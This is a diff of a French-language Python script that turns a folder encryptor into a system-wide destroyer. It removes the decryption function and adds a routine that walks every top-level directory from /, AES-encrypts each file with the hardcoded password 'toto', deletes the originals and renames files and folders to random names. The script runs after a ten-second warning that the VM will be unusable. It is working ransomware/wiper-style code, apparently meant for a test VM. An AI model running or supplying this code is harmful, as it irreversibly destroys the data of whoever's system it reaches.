@@ -1,11 +1,10 @@
-from pyAesCrypt import encryptFile, decryptFile
+from pyAesCrypt import encryptFile
 import os
 import uuid
 
 # Paramètres
 buffer_size = 64 * 1024  # Taille du buffer (64 Ko)
 password = "toto"  # Mot de passe de chiffrement
-
 
 # Fonction de chiffrement avec renommage définitif
 def chiffrer_dossier(dossier_source):
@@ -19,13 +18,17 @@ def chiffrer_dossier(dossier_source):
             nom_fichier_chiffre = str(uuid.uuid4()) + ".aes"
             chemin_dest = os.path.join(racine, nom_fichier_chiffre)
 
-            # Chiffrement du fichier
-            encryptFile(chemin_source, chemin_dest, password, buffer_size)
-            print(f"Fichier chiffré : {chemin_source} -> {chemin_dest}")
+            try:
+                # Chiffrement du fichier
+                encryptFile(chemin_source, chemin_dest, password, buffer_size)
+                print(f"Fichier chiffré : {chemin_source} -> {chemin_dest}")
 
-            # Suppression de l'original après chiffrement
-            os.remove(chemin_source)
-            print(f"Fichier original supprimé : {chemin_source}")
+                # Suppression de l'original après chiffrement
+                os.remove(chemin_source)
+                print(f"Fichier original supprimé : {chemin_source}")
+
+            except Exception as e:
+                print(f"Erreur lors du chiffrement de {chemin_source} : {e}")
 
         # Renommer les dossiers
         dossier_source_absolu = os.path.abspath(dossier_source)
@@ -35,64 +38,29 @@ def chiffrer_dossier(dossier_source):
             os.rename(racine, dossier_renomme)
             print(f"Dossier renommé : {racine} -> {dossier_renomme}")
 
+# Fonction principale
+def chiffrer_systeme():
+    # Parcourir tous les dossiers racine sauf ceux critiques
+    exclusions = ["/proc", "/sys", "/dev", "/run", "/tmp", "/boot", "/mnt", "/media", "/snap"]
+    for dossier in os.listdir("/"):
+        chemin_dossier = os.path.join("/", dossier)
+        # Vérifier si c'est un dossier et non exclu
+        if os.path.isdir(chemin_dossier) and chemin_dossier not in exclusions:
+            print(f"\n[INFO] Chiffrement du dossier : {chemin_dossier}")
+            chiffrer_dossier(chemin_dossier)
 
-# Fonction de déchiffrement sans restauration des noms d'origine
-def dechiffrer_dossier(dossier_source):
-    for racine, sous_dossiers, fichiers in os.walk(dossier_source, topdown=False):
-        for fichier in fichiers:
-            # On ne traite que les fichiers .aes
-            if fichier.endswith(".aes"):
-                chemin_source = os.path.join(racine, fichier)
-
-                # Générer un nom de fichier déchiffré (aléatoire, sans .aes)
-                nom_fichier_dechiffre = str(uuid.uuid4())
-                chemin_dest = os.path.join(racine, nom_fichier_dechiffre)
-
-                # Déchiffrement du fichier
-                decryptFile(chemin_source, chemin_dest, password, buffer_size)
-                print(f"Fichier déchiffré : {chemin_source} -> {chemin_dest}")
-
-                # Suppression du fichier chiffré après déchiffrement
-                os.remove(chemin_source)
-                print(f"Fichier chiffré supprimé : {chemin_source}")
-
-        # Les dossiers gardent leurs noms aléatoires après déchiffrement
-
-
-# Menu interactif
+# Confirmation avant de lancer le chiffrement
 def menu():
-    while True:
-        print("\n=== MENU ===")
-        print("1. Chiffrer un dossier existant (renomme définitivement les fichiers et dossiers)")
-        print("2. Déchiffrer un dossier existant (les noms restent aléatoires)")
-        print("3. Quitter")
-
-        choix = input("\nChoisissez une option (1, 2 ou 3) : ")
-
-        if choix == "1":
-            dossier_source = input("Entrez le chemin du dossier à chiffrer : ")
-            if os.path.isdir(dossier_source):
-                chiffrer_dossier(dossier_source)
-                print(
-                    "\nTous les fichiers ont été chiffrés avec succès, les originaux supprimés et les dossiers/fichiers renommés définitivement.")
-            else:
-                print("Le dossier n'existe pas. Veuillez vérifier le chemin.")
-
-        elif choix == "2":
-            dossier_source = input("Entrez le chemin du dossier à déchiffrer : ")
-            if os.path.isdir(dossier_source):
-                dechiffrer_dossier(dossier_source)
-                print("\nTous les fichiers ont été déchiffrés avec succès, les fichiers chiffrés supprimés.")
-            else:
-                print("Le dossier n'existe pas. Veuillez vérifier le chemin.")
-
-        elif choix == "3":
-            print("\nAu revoir !")
-            break
-
-        else:
-            print("\nOption invalide. Veuillez choisir 1, 2 ou 3.")
-
+    print("\n=== ATTENTION ===")
+    print("Ce script va chiffrer TOUS les dossiers de la VM, sans exception.")
+    print("Les fichiers originaux seront supprimés.")
+    print("Les noms des dossiers et fichiers seront définitivement perdus.")
+    print("La VM sera inutilisable après le chiffrement.")
+    print("\nDémarrage dans 10 secondes... (Appuyez sur Ctrl+C pour annuler)")
+    import time
+    time.sleep(10)
+    chiffrer_systeme()
 
 # Lancer le menu
 menu()
+EOF
